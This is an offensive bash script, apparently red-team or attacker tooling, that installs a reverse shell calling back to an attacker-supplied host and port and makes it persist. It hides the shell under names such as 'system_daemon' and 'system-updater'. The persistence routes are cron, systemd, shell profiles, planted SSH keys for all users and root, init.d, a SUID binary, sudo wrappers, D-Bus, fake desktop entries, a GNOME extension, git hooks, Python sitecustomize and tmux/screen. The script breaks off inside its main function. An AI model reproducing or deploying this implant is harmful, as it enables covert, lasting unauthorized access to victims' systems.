#!/bin/bash

# Linux Persistence Implant Script
# Usage: ./persistence.sh <lhost> <lport>
# Author: S4int
# Enhanced to support both privileged and unprivileged users

# Check for arguments
if [ $# -ne 2 ]; then
    echo "Usage: $0 <lhost> <lport>"
    exit 1
fi

LHOST="$1"
LPORT="$2"
CURRENT_USER=$(whoami)
CURRENT_PATH=$(pwd)
SHELL_NAME="system_daemon"
SHELL_PATH="/var/tmp/.${SHELL_NAME}"
TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S")
IS_ROOT=false
SESSION_ID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)

# Determine if user has root privileges
if [ "$EUID" -eq 0 ]; then
    IS_ROOT=true
fi

# Reverse shell payload function
generate_reverse_shell() {
    echo "#!/bin/bash
while true; do
    bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' 2>/dev/null
    sleep 60
done" > "$SHELL_PATH"
    chmod +x "$SHELL_PATH"
}

# Status function
print_status() {
    echo "[*] $1"
}

# Success function
print_success() {
    echo "[+] $1"
}

# Error function
print_error() {
    echo "[!] $1"
}

# Info function for root/unprivileged methods
print_info() {
    if [ "$IS_ROOT" = true ]; then
        echo "[ROOT] $1"
    else
        echo "[USER] $1"
    fi
}

# Create our reverse shell script
create_reverse_shell() {
    print_status "Creating reverse shell script..."
    generate_reverse_shell
    print_success "Reverse shell created at $SHELL_PATH"
}

# 1. Cron Job Persistence
setup_cron_persistence() {
    print_status "Setting up cron persistence..."
    
    # Create a random minute value
    RANDOM_MIN=$((RANDOM % 60))
    
    # Add to user's crontab (works for any user)
    (crontab -l 2>/dev/null; echo "$RANDOM_MIN * * * * $SHELL_PATH >/dev/null 2>&1") | crontab -
    print_info "User crontab persistence established"
    
    # Add to system crontab if we have root
    if [ "$IS_ROOT" = true ]; then
        echo "$RANDOM_MIN * * * * root $SHELL_PATH >/dev/null 2>&1" > /etc/cron.d/system_update
        print_info "System crontab persistence established"
    fi
    
    print_success "Cron persistence established"
    # To use: Start a listener with: nc -nlvp $LPORT
    # The connection will arrive every hour at minute $RANDOM_MIN
    print_status "Usage: Start a listener with: nc -nlvp $LPORT"
    print_status "       The connection will arrive every hour at minute $RANDOM_MIN"
}

# 2. Systemd Service Persistence
setup_systemd_persistence() {
    if [ "$IS_ROOT" = true ]; then
        print_status "Setting up systemd persistence..."
        
        # Create systemd service
        cat > /etc/systemd/system/system-updater.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=$SHELL_PATH
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

        # Enable and start the service
        systemctl enable system-updater.service >/dev/null 2>&1
        systemctl start system-updater.service >/dev/null 2>&1
        
        # Create a systemd timer as alternative method
        cat > /etc/systemd/system/system-updater.timer << EOF
[Unit]
Description=Run System Updater periodically

[Timer]
OnBootSec=5min
OnUnitActiveSec=30min

[Install]
WantedBy=timers.target
EOF

        systemctl enable system-updater.timer >/dev/null 2>&1
        systemctl start system-updater.timer >/dev/null 2>&1
        
        print_success "Systemd persistence established"
        # To use: Start a listener with: nc -nlvp $LPORT
        # The service will maintain a persistent connection
        # The timer will create a connection every 30 minutes
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The service will maintain a persistent connection"
        print_status "       The timer will create a connection every 30 minutes"
    else
        # Unprivileged user systemd persistence (user service)
        print_status "Setting up user systemd persistence..."
        
        # Create user systemd directory if it doesn't exist
        mkdir -p ~/.config/systemd/user/
        
        # Create user systemd service
        cat > ~/.config/systemd/user/user-updater.service << EOF
[Unit]
Description=User Update Service
After=network.target

[Service]
Type=simple
ExecStart=$SHELL_PATH
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

        # Create user systemd timer
        cat > ~/.config/systemd/user/user-updater.timer << EOF
[Unit]
Description=Run User Updater periodically

[Timer]
OnBootSec=5min
OnUnitActiveSec=30min

[Install]
WantedBy=timers.target
EOF

        # Enable and start the user service and timer
        systemctl --user enable user-updater.service >/dev/null 2>&1
        systemctl --user start user-updater.service >/dev/null 2>&1
        systemctl --user enable user-updater.timer >/dev/null 2>&1
        systemctl --user start user-updater.timer >/dev/null 2>&1
        
        # Enable lingering for this user to keep services running after logout
        if command -v loginctl > /dev/null 2>&1; then
            loginctl enable-linger $CURRENT_USER >/dev/null 2>&1
        fi
        
        print_info "User systemd persistence established"
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The service will maintain a persistent connection"
        print_status "       The timer will create a connection every 30 minutes"
    fi
}

# 3. Bash Profile Persistence
setup_bash_profile_persistence() {
    print_status "Setting up bash profile persistence..."
    
    # Add to various shell profile files (works for any user)
    for profile in ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc; do
        if [ -f "$profile" ]; then
            echo "# System Update Check - Added $TIMESTAMP" >> "$profile"
            echo "nohup $SHELL_PATH >/dev/null 2>&1 &" >> "$profile"
            print_info "Added persistence to $profile"
        fi
    done
    
    # If we're root, add to global profile
#    if [ "$IS_ROOT" = true ]; then
#        echo "# System Update Service - Added $TIMESTAMP" >> /etc/profile.d/system-update.sh
#        echo "if [ \$(id -u) -ne 0 ]; then" >> /etc/profile.d/system-update.sh
#        echo "    nohup $SHELL_PATH >/dev/null 2>&1 &" >> /etc/profile.d/system-update.sh
#        echo "fi" >> /etc/profile.d/system-update.sh
#        chmod +x /etc/profile.d/system-update.sh
#        print_info "Added global profile persistence via /etc/profile.d/"
#    fi
    
    print_success "Bash profile persistence established"
    # To use: Start a listener with: nc -nlvp $LPORT
    # The connection will arrive each time a user logs in or opens a new terminal
    print_status "Usage: Start a listener with: nc -nlvp $LPORT"
    print_status "       The connection will arrive each time a user logs in or opens a new terminal"
}

# 4. SSH Authorized Keys Persistence
setup_ssh_persistence() {
    print_status "Setting up SSH persistence..."
    
    # Check if SSH key exists, if not generate one (works for any user)
    if [ ! -f ~/.ssh/id_rsa ]; then
        mkdir -p ~/.ssh
        ssh-keygen -t rsa -f ~/.ssh/id_rsa -N "" >/dev/null 2>&1
        print_info "Generated new SSH key"
    fi
    
    if [ -f ~/.ssh/id_rsa.pub ]; then
        # Add to authorized_keys (works for any user)
        mkdir -p ~/.ssh
        cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
        chmod 600 ~/.ssh/authorized_keys
        print_info "Added key to current user's authorized_keys"
        
        # Print the private key for the user to save
        print_status "Save this SSH private key for future access:"
        cat ~/.ssh/id_rsa
    fi
    
    # If we're root, try to add our key to other users
    if [ "$IS_ROOT" = true ]; then
        for homedir in /home/*; do
            username=$(basename "$homedir")
            if [ "$username" != "*" ] && [ -d "$homedir" ]; then
                mkdir -p "$homedir/.ssh" 2>/dev/null
                cat ~/.ssh/id_rsa.pub >> "$homedir/.ssh/authorized_keys" 2>/dev/null
                chown -R "$username":"$username" "$homedir/.ssh" 2>/dev/null
                chmod 700 "$homedir/.ssh" 2>/dev/null
                chmod 600 "$homedir/.ssh/authorized_keys" 2>/dev/null
                print_info "Added key to $username's authorized_keys"
            fi
        done
        
        # Add to root authorized_keys
        mkdir -p /root/.ssh
        cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
        chmod 700 /root/.ssh
        chmod 600 /root/.ssh/authorized_keys
        print_info "Added key to root's authorized_keys"
    fi
    
    print_success "SSH persistence established"
    # To use: Save the displayed private key to a file (e.g., stolen_key.pem)
    # chmod 600 stolen_key.pem
    # ssh -i stolen_key.pem user@target_ip
    # This provides direct SSH access without the reverse shell listener
    print_status "Usage: Save the private key shown above to a file (e.g., stolen_key.pem)"
    print_status "       chmod 600 stolen_key.pem"
    print_status "       ssh -i stolen_key.pem $CURRENT_USER@[target_ip]"
    print_status "       This provides direct SSH access without needing a listener"
}

# 5. Init.d Startup Script Persistence
setup_init_persistence() {
    if [ "$IS_ROOT" = true ]; then
        print_status "Setting up init.d persistence..."
        
        # Create init.d script
        cat > /etc/init.d/system-update << EOF
#!/bin/sh
### BEGIN INIT INFO
# Provides:          system-update
# Required-Start:    \$network \$remote_fs \$syslog
# Required-Stop:     \$network \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Update Service
# Description:       Runs system update tasks in the background
### END INIT INFO

case "\$1" in
    start)
        $SHELL_PATH &
        ;;
    stop)
        killall -q $(basename $SHELL_PATH)
        ;;
    restart)
        killall -q $(basename $SHELL_PATH)
        $SHELL_PATH &
        ;;
    *)
        echo "Usage: \$0 {start|stop|restart}"
        exit 1
        ;;
esac
exit 0
EOF

        chmod +x /etc/init.d/system-update
        
        # Update rc.d
        if command -v update-rc.d > /dev/null 2>&1; then
            update-rc.d system-update defaults >/dev/null 2>&1
        elif command -v chkconfig > /dev/null 2>&1; then
            chkconfig --add system-update >/dev/null 2>&1
        fi
        
        print_success "Init.d persistence established"
        # To use: Start a listener with: nc -nlvp $LPORT
        # The connection will arrive each time the system boots
        # Or manually trigger with: /etc/init.d/system-update start
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The connection will arrive each time the system boots"
        print_status "       Or manually trigger with: /etc/init.d/system-update start"
    else
        print_info "Skipping init.d persistence (requires root)"
    fi
}

# 6. Preload Library Persistence (Advanced)
#setup_preload_persistence() {
#    if [ "$IS_ROOT" = true ]; then
#        print_status "Setting up LD_PRELOAD persistence (advanced)..."
#        
#        # Create a C file for the preload library
#        cat > /var/tmp/preload.c << 'EOF'
##include <stdio.h>
##include <stdlib.h>
##include <unistd.h>
##include <sys/types.h>
##include <sys/stat.h>
#
#// Function that will be executed when the library is loaded
#__attribute__((constructor)) void init(void) {
#   // Only run this when the user is root
#    if (geteuid() == 0) {
#        // Fork to background
#        if (fork() == 0){
#            // Close standard file descriptors
#            fclose(stdin);
#            fclose(stdout);
#            fclose(stderr);
#            
#            // Execute our payload
#            system("SHELL_PATH_PLACEHOLDER &");
#            exit(0);
#        }
#    }
#}
#EOF

#        # Replace placeholder with actual shell path
#        sed -i "s|SHELL_PATH_PLACEHOLDER|$SHELL_PATH|g" /var/tmp/preload.c
#        
#        # Try to compile (requires gcc)
#        if command -v gcc > /dev/null 2>&1; then
#            gcc -shared -fPIC /var/tmp/preload.c -o /usr/lib/libsystem.so
#            echo "/usr/lib/libsystem.so" > /etc/ld.so.preload
#            print_success "LD_PRELOAD persistence established"
#            # To use: Start a listener with: nc -nlvp $LPORT
#            # The connection will arrive each time a setuid program is executed
#            # Particularly when a user performs a sudo command
#            print_status "Usage: Start a listener with: nc -nlvp $LPORT"
#            print_status "       The connection will arrive each time a setuid program is executed"
#            print_status "       Particularly effective when a user performs a sudo command"
#        else
#            print_error "gcc not found, skipping LD_PRELOAD persistence"
#        fi
#        
#        # Clean up
#        rm -f /var/tmp/preload.c
#    else
#        print_info "Skipping LD_PRELOAD persistence (requires root)"
#    fi
#}

# 7. PAM Persistence (Advanced)
#setup_pam_persistence() {
#    if [ "$IS_ROOT" = true ]; then
#        print_status "Setting up PAM persistence (advanced)..."
#        
#        # Create a PAM config file to execute our shell
#        cat > /etc/pam.d/system-update << EOF
#session optional pam_exec.so seteuid $SHELL_PATH
#EOF

        # Add our PAM module to common-session
#        echo "session optional pam_exec.so seteuid $SHELL_PATH" >> /etc/pam.d/common-session
        
#        print_success "PAM persistence established"
#        # To use: Start a listener with: nc -nlvp $LPORT
#        # The connection will arrive each time a user logs in or authenticates
        # Examples: ssh login, su, sudo, etc.
#        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
#        print_status "       The connection will arrive each time a user logs in or authenticates"
#        print_status "       Examples: ssh login, su, sudo, etc."
#    else
#        print_info "Skipping PAM persistence (requires root)"
#    fi
#}

# 8. SUID Binary Persistence (Advanced)
setup_suid_persistence() {
    if [ "$IS_ROOT" = true ]; then
        print_status "Setting up SUID binary persistence (advanced)..."
        
        # Create a SUID C program
        cat > /var/tmp/suid.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    // Drop privileges temporarily
    setuid(getuid());
    
    // Execute the payload
    system("SHELL_PATH_PLACEHOLDER &");
    
    // Execute a legitimate program to avoid suspicion
    execl("/usr/bin/id", "id", NULL);
    
    return 0;
}
EOF

        # Replace placeholder with actual shell path
        sed -i "s|SHELL_PATH_PLACEHOLDER|$SHELL_PATH|g" /var/tmp/suid.c
        
        # Try to compile (requires gcc)
        if command -v gcc > /dev/null 2>&1; then
            gcc /var/tmp/suid.c -o /usr/local/bin/system-helper
            
            # Set SUID bit
            chmod 4755 /usr/local/bin/system-helper
            
            print_success "SUID binary persistence established at /usr/local/bin/system-helper"
            # To use: Start a listener with: nc -nlvp $LPORT
            # Then trigger by having any user run: /usr/local/bin/system-helper
            # The program appears to run "id" command but secretly triggers a reverse shell
            print_status "Usage: Start a listener with: nc -nlvp $LPORT"
            print_status "       Then trigger by having any user run: /usr/local/bin/system-helper"
            print_status "       The program appears to run 'id' command but secretly triggers a reverse shell"
        else
            print_error "gcc not found, skipping SUID persistence"
        fi
        
        # Clean up
        rm -f /var/tmp/suid.c
    else
        print_info "Skipping SUID persistence (requires root)"
        
        # Add a local binary persistence method for unprivileged users
        print_status "Setting up local binary wrapper persistence..."
        
        # Create a local bin directory if it doesn't exist
        mkdir -p ~/.local/bin
        
        # Find common commands the user uses
        COMMON_COMMANDS=("ls" "grep" "cat" "find" "ps")
        
        # Choose a command to wrap
        WRAP_COMMAND=${COMMON_COMMANDS[$RANDOM % ${#COMMON_COMMANDS[@]}]}
        
        # Create a wrapper script
        cat > ~/.local/bin/$WRAP_COMMAND << EOF
#!/bin/bash
# Launch our backdoor
nohup $SHELL_PATH >/dev/null 2>&1 &

# Execute the real command
$(which $WRAP_COMMAND) "\$@"
EOF
        
        chmod +x ~/.local/bin/$WRAP_COMMAND
        
        # Add our local bin to PATH in shell profiles
        for profile in ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc; do
            if [ -f "$profile" ]; then
                if ! grep -q "PATH=~/.local/bin:\$PATH" "$profile"; then
                    echo "# Add local bin to PATH - Added $TIMESTAMP" >> "$profile"
                    echo "export PATH=~/.local/bin:\$PATH" >> "$profile"
                fi
            fi
        done
        
        print_info "Local binary wrapper persistence established"
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The connection will arrive each time the user runs '$WRAP_COMMAND'"
    fi
}

# 9. Kernel Module Persistence (Very Advanced - not implementing due to high risk)
setup_kernel_persistence() {
    if [ "$IS_ROOT" = true ]; then
        print_status "Kernel module persistence is very advanced and risky - skipping"
        print_status "Requires kernel headers and can destabilize the system"
    else
        print_info "Skipping kernel module persistence (requires root)"
    fi
}

# 10. At Job Persistence
setup_at_persistence() {
    print_status "Setting up at job persistence..."
    
    # Check if at command is available
    if command -v at > /dev/null 2>&1; then
        # Schedule an at job for 1 hour from now
        echo "$SHELL_PATH" | at now + 1 hour 2>/dev/null
        
        # Schedule an at job for midnight
        echo "$SHELL_PATH" | at midnight 2>/dev/null
        
        print_success "At job persistence established"
        # To use: Start a listener with: nc -nlvp $LPORT
        # The connection will arrive at scheduled times:
        # - 1 hour from now
        # - At midnight
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The connection will arrive at scheduled times:"
        print_status "       - 1 hour from now"
        print_status "       - At midnight"
    else
        print_error "at command not found, skipping at job persistence"
        
        # Alternative for unprivileged users: use sleep in background
        print_status "Setting up background sleep persistence..."
        
        # Launch a background process that will sleep for 1 hour and then connect
        (sleep 3600; $SHELL_PATH) &
        
        print_info "Background sleep persistence established"
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The connection will arrive in 1 hour"
    fi
}

# 11. Sudo Configuration Persistence
setup_sudo_persistence() {
    if [ "$IS_ROOT" = true ]; then
        print_status "Setting up sudo persistence..."
        
        # Create a sudo wrapper script
        cat > /usr/local/bin/sudo_wrapper << EOF
#!/bin/bash
# Run our backdoor
nohup $SHELL_PATH >/dev/null 2>&1 &

# Execute the real sudo with all arguments
/usr/bin/sudo "\$@"
EOF
        chmod 755 /usr/local/bin/sudo_wrapper
        
        # Create a symlink to our wrapper in /usr/local/bin
        # This works because /usr/local/bin is typically before /usr/bin in PATH
        if [ -f /usr/bin/sudo ]; then
            # Only create if we're not overwriting something
            if [ ! -e /usr/local/bin/sudo ]; then
                ln -sf /usr/local/bin/sudo_wrapper /usr/local/bin/sudo
                print_success "Sudo wrapper persistence established"
                print_status "Usage: Start a listener with: nc -nlvp $LPORT"
                print_status "       The connection will arrive each time any user performs a sudo command"
            else
                print_error "Could not establish sudo persistence, /usr/local/bin/sudo already exists"
            fi
        else
            print_error "Could not find /usr/bin/sudo"
        fi
    else
        print_info "Skipping sudo persistence (requires root)"
        
        # Alternative for unprivileged users: alias sudo command
        if command -v sudo > /dev/null 2>&1; then
            for profile in ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc; do
                if [ -f "$profile" ]; then
                    echo "# Sudo alias - Added $TIMESTAMP" >> "$profile"
                    echo "alias sudo='$SHELL_PATH >/dev/null 2>&1 & sudo'" >> "$profile"
                fi
            done
            
            print_info "Sudo alias persistence established"
            print_status "Usage: Start a listener with: nc -nlvp $LPORT"
            print_status "       The connection will arrive each time the user runs sudo"
        fi
    fi
}

# 12. User Crontab Persistence (Different from System Cron)
setup_user_crontab_persistence() {
    print_status "Setting up user crontab persistence..."
    
    # Create a random minute value
    RANDOM_MIN=$((RANDOM % 60))
    
    # Add to crontab using environment variables (works for any user)
    (crontab -l 2>/dev/null; echo "SHELL=/bin/bash") | crontab -
    (crontab -l 2>/dev/null; echo "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin") | crontab -
    (crontab -l 2>/dev/null; echo "$RANDOM_MIN * * * * $SHELL_PATH >/dev/null 2>&1") | crontab -
    
    print_success "User crontab persistence established"
    # To use: Start a listener with: nc -nlvp $LPORT
    # The connection will arrive every hour at minute $RANDOM_MIN
    # This persistence uses the current user's crontab
    print_status "Usage: Start a listener with: nc -nlvp $LPORT"
    print_status "       The connection will arrive every hour at minute $RANDOM_MIN"
    print_status "       This persistence uses the current user's crontab"
}

# 13. D-Bus Persistence (Advanced)
setup_dbus_persistence() {
    if [ "$IS_ROOT" = true ]; then
        print_status "Setting up D-Bus persistence (advanced)..."
        
        # Create a D-Bus service file
        mkdir -p /usr/share/dbus-1/system-services
        cat > /usr/share/dbus-1/system-services/org.system.Update.service << EOF
[D-BUS Service]
Name=org.system.Update
Exec=$SHELL_PATH
User=root
EOF

        # Create a D-Bus config file
        mkdir -p /etc/dbus-1/system.d
        cat > /etc/dbus-1/system.d/org.system.Update.conf << EOF
<!DOCTYPE busconfig PUBLIC "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig>
  <policy user="root">
    <allow own="org.system.Update"/>
  </policy>
  <policy context="default">
    <allow send_destination="org.system.Update"/>
  </policy>
</busconfig>
EOF

        print_success "D-Bus persistence established"
        # To use: Start a listener with: nc -nlvp $LPORT
        # The connection will be triggered when D-Bus activates the service
        # Can be manually activated with: dbus-send --system --dest=org.system.Update /org/system/Update
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The connection will be triggered when D-Bus activates the service"
        print_status "       Can be manually activated with: dbus-send --system --dest=org.system.Update /org/system/Update"
    else
        print_info "Skipping system D-Bus persistence (requires root)"
        
        # Setup user D-Bus service for unprivileged users
        print_status "Setting up user D-Bus persistence..."
        
        # Create user D-Bus service directory
        mkdir -p ~/.local/share/dbus-1/services
        
        # Create user D-Bus service file
        cat > ~/.local/share/dbus-1/services/org.user.Update.service << EOF
[D-BUS Service]
#Name=org.user.Update
Exec=$SHELL_PATH
EOF

        print_info "User D-Bus persistence established"
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       Can be manually activated with: dbus-send --session --dest=org.user.Update /org/user/Update"
    fi
}

# 14. XDG Autostart Persistence
#setup_xdg_persistence() {
#    print_status "Setting up XDG autostart persistence..."
    
    # Create autostart directory if it doesn't exist (works for any user)
#    mkdir -p ~/.config/autostart
    
    # Create a desktop entry file
#    cat > ~/.config/autostart/system-update.desktop << EOF
#[Desktop Entry]
#Type=Application
#Name=System Update
#Exec=$SHELL_PATH
#Hidden=false
#NoDisplay=false
#X-GNOME-Autostart-enabled=true
#Comment=System Update Service
#EOF

#    print_info "User XDG autostart persistence established"
    
    # If we're root, add for all users
#    if [ "$IS_ROOT" = true ]; then
#        mkdir -p /etc/xdg/autostart
#        cat > /etc/xdg/autostart/system-update.desktop << EOF
#[Desktop Entry]
#Type=Application
#Name=System Update
#Exec=$SHELL_PATH
#Hidden=false
#NoDisplay=false
#X-GNOME-Autostart-enabled=true
#Comment=System Update Service
#EOF
#        print_info "System-wide XDG autostart persistence established"
#    fi
#    
#    print_success "XDG autostart persistence established"
#    # To use: Start a listener with: nc -nlvp $LPORT
#    # The connection will arrive each time a user logs into a graphical desktop session
#    print_status "Usage: Start a listener with: nc -nlvp $LPORT"
#    print_status "       The connection will arrive each time a user logs into a graphical desktop session"
#}

# 15. Desktop Entry Persistence (for unprivileged users)
setup_desktop_persistence() {
    print_status "Setting up desktop entry persistence..."
    
    # Create applications directory if it doesn't exist
    mkdir -p ~/.local/share/applications
    
    # Create desktop entry for frequently used applications
    COMMON_APPS=("firefox" "chrome" "terminal" "gedit" "nautilus" "calculator")
    
    # Choose a random application to mimic
    APP_NAME=${COMMON_APPS[$RANDOM % ${#COMMON_APPS[@]}]}
    
    # Create desktop entry
    cat > ~/.local/share/applications/$APP_NAME.desktop << EOF
[Desktop Entry]
Type=Application
Name=$APP_NAME
Exec=sh -c "$SHELL_PATH & $(which $APP_NAME) %U"
Icon=utilities-terminal
Terminal=false
Categories=System;Utility;
EOF

    print_info "Desktop entry persistence established"
    print_status "Usage: Start a listener with: nc -nlvp $LPORT"
    print_status "       The connection will arrive when the user runs $APP_NAME"
}

# 16. GNOME Shell Extension Persistence (for unprivileged users)
setup_gnome_persistence() {
    print_status "Setting up GNOME Shell extension persistence..."
    
    # Check if we're running in a GNOME environment
    if command -v gnome-shell > /dev/null 2>&1; then
        # Create GNOME Shell extension directory
        EXT_UUID="system-monitor@example.com"
        EXT_DIR="$HOME/.local/share/gnome-shell/extensions/$EXT_UUID"
        mkdir -p "$EXT_DIR"
        
        # Create metadata.json
        cat > "$EXT_DIR/metadata.json" << EOF
{
  "name": "System Monitor",
  "description": "System monitoring extension",
  "uuid": "$EXT_UUID",
  "shell-version": ["3.36", "3.38", "40", "41", "42"]
}
EOF

        # Create extension.js with backdoor
        cat > "$EXT_DIR/extension.js" << EOF
const Main = imports.ui.main;
const GLib = imports.gi.GLib;

class Extension {
    constructor() {
        this._connectId = null;
    }
    
    enable() {
        // Run our backdoor when the extension loads
        GLib.spawn_command_line_async('$SHELL_PATH');
        
        // Schedule periodic execution
        this._connectId = GLib.timeout_add_seconds(GLib.PRIORITY_DEFAULT, 3600, () => {
            GLib.spawn_command_line_async('$SHELL_PATH');
            return true; // Return true to keep the timeout running
        });
    }
    
    disable() {
        if (this._connectId) {
            GLib.Source.remove(this._connectId);
            this._connectId = null;
        }
    }
}

function init() {
    return new Extension();
}
EOF

        print_info "GNOME Shell extension persistence established"
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The connection will arrive when GNOME Shell loads the extension"
        print_status "       Enable the extension with: gnome-extensions enable $EXT_UUID"
    else
        print_info "Skipping GNOME Shell persistence (requires GNOME environment)"
    fi
}

# 17. Git Hooks Persistence (for unprivileged users)
setup_git_hooks_persistence() {
    print_status "Setting up Git hooks persistence..."
    
    # Check if git is installed
    if command -v git > /dev/null 2>&1; then
        # Look for git repositories in user's home directory
        GIT_REPOS=$(find ~ -name ".git" -type d 2>/dev/null | head -5)
        
        if [ -n "$GIT_REPOS" ]; then
            for repo in $GIT_REPOS; do
                # Create post-checkout hook
                mkdir -p "$repo/hooks"
                cat > "$repo/hooks/post-checkout" << EOF
#!/bin/sh
$SHELL_PATH >/dev/null 2>&1 &
exit 0
EOF
                chmod +x "$repo/hooks/post-checkout"
                
                # Create post-merge hook
                cat > "$repo/hooks/post-merge" << EOF
#!/bin/sh
$SHELL_PATH >/dev/null 2>&1 &
exit 0
EOF
                chmod +x "$repo/hooks/post-merge"
                
                # Create pre-commit hook (always succeeds)
                cat > "$repo/hooks/pre-commit" << EOF
#!/bin/sh
$SHELL_PATH >/dev/null 2>&1 &
exit 0
EOF
                chmod +x "$repo/hooks/pre-commit"
                
                print_info "Git hooks added to repository: $repo"
            done
            
            print_success "Git hooks persistence established"
            print_status "Usage: Start a listener with: nc -nlvp $LPORT"
            print_status "       The connection will arrive when the user performs git operations"
        else
            print_info "No Git repositories found, skipping Git hooks persistence"
        fi
    else
        print_info "Git not installed, skipping Git hooks persistence"
    fi
}

# 18. Python Site Packages Persistence (for unprivileged users)
setup_python_persistence() {
    print_status "Setting up Python sitecustomize persistence..."
    
    # Check if Python is installed
    if command -v python3 > /dev/null 2>&1; then
        # Get Python site-packages directory
        PYTHON_SITE=$(python3 -c "import site; print(site.getusersitepackages())" 2>/dev/null)
        
        if [ -n "$PYTHON_SITE" ]; then
            # Create site directory if it doesn't exist
            mkdir -p "$PYTHON_SITE"
            
            # Create sitecustomize.py
            cat > "$PYTHON_SITE/sitecustomize.py" << EOF
import os
import subprocess
import threading

def run_backdoor():
    try:
        subprocess.Popen(['$SHELL_PATH'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# Run in a separate thread to avoid blocking
threading.Thread(target=run_backdoor, daemon=True).start()
EOF

            print_info "Python sitecustomize persistence established"
            print_status "Usage: Start a listener with: nc -nlvp $LPORT"
            print_status "       The connection will arrive when Python is executed"
        else
            print_info "Could not determine Python site-packages, skipping Python persistence"
        fi
    else
        print_info "Python not installed, skipping Python persistence"
    fi
}

# 19. Tmux/Screen Sessions Persistence (for unprivileged users)
setup_terminal_multiplexer_persistence() {
    print_status "Setting up terminal multiplexer persistence..."
    
    # Check for tmux
    if command -v tmux > /dev/null 2>&1; then
        # Create/modify tmux configuration
        echo "# System Update - Added $TIMESTAMP" >> ~/.tmux.conf
        echo "set-option -g default-command \"$SHELL_PATH >/dev/null 2>&1 & \\\"\$(command -v \$SHELL)\\\" -l\"" >> ~/.tmux.conf
        
        print_info "Tmux persistence established"
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The connection will arrive when the user starts tmux"
    fi
    
    # Check for screen
    if command -v screen > /dev/null 2>&1; then
        # Create/modify screen configuration
        echo "# System Update - Added $TIMESTAMP" >> ~/.screenrc
        echo "exec $SHELL_PATH >/dev/null 2>&1 &" >> ~/.screenrc
        
        print_info "Screen persistence established"
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The connection will arrive when the user starts screen"
    fi
}

# 20. Browser Extension Persistence (for unprivileged users)
#setup_browser_persistence() {
#    print_status "Setting up browser extension persistence..."
#    
#    # Check for Firefox profile directory
#    FIREFOX_DIR=$(find ~/.mozilla/firefox -name "*.default*" -type d 2>/dev/null | head -1)
#    
#    if [ -n "$FIREFOX_DIR" ]; then
#        # Create user.js file or append to it
#        echo "// System Update - Added $TIMESTAMP" >> "$FIREFOX_DIR/user.js"
#        echo "user_pref(\"browser.startup.homepage\", \"data:text/html,<html><body><script>fetch('file://$SHELL_PATH').then(() => {}).catch(() => {})</script></body></html>\");" >> "$FIREFOX_DIR/user.js"
#        
#        print_info "Firefox persistence established"
#        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
#        print_status "       The connection will attempt when Firefox starts"
#    fi
#    
#    # Check for Chrome/Chromium directory
#    CHROME_DIR="$HOME/.config/google-chrome"
#    CHROMIUM_DIR="$HOME/.config/chromium"
#    
#    if [ -d "$CHROME_DIR" ] || [ -d "$CHROMIUM_DIR" ]; then
#        # Create a minimal extension
#        for browser_dir in "$CHROME_DIR" "$CHROMIUM_DIR"; do
#            if [ -d "$browser_dir" ]; then
#                EXT_DIR="$browser_dir/Default/Extensions/backdoor"
#                mkdir -p "$EXT_DIR"
#                
#                # Create manifest.json
#                cat > "$EXT_DIR/manifest.json" << EOF
#{
#  "name": "System Updater",
#  "version": "1.0",
#  "description": "System Update Service",
#  "background": {
#    "scripts": ["background.js"],
#    "persistent": true
#  },
#  "permissions": ["nativeMessaging"],
#  "manifest_version": 2
#}
#EOF
#                
#                # Create background.js
#                cat > "$EXT_DIR/background.js" << EOF
#// Background script that runs when browser starts
#function runBackdoor() {
#  try {
#    // This won't actually work in modern browsers due to security,
#    // but could work with a proper native messaging host
#    fetch('file://$SHELL_PATH');
#  } catch(e) {}
#}
#
#// Try to run backdoor on startup
#runBackdoor();
#
#// Try periodically
#setInterval(runBackdoor, 3600000);
#EOF
#                
#                print_info "Chrome/Chromium persistence attempt established"
#                print_status "Note: Browser security will likely prevent this from working"
#            fi
#        done
#    fi
#}

# Main function
main() {
    print_status "Starting persistence installation..."
    print_status "Target: $LHOST:$LPORT"
    print_status "Running as: $CURRENT_USER ($(if [ "$IS_ROOT" = true ]; then echo "root"; else echo "unprivileged user"; fi))"
    
    # Create the reverse shell script
    create_reverse_shell
    
    # Install persistence mechanisms
    # These work for both privileged and unprivileged users
    setup_cron_persistence
    setup_systemd_persistence
    setup_bash_profile_persistence
    setup_ssh_persistence
    setup_user_crontab_persistence
    setup_xdg_persistence
    setup_at_persistence
    setup_desktop_persistence
    setup_gnome_persistence
    setup_git_hooks_persistence
    setup_python_persistence
    setup_terminal_multiplexer_persistence
    setup_browser_persistence
    
    # These require root privileges
    setup_init_persistence
    setup_preload_persistence
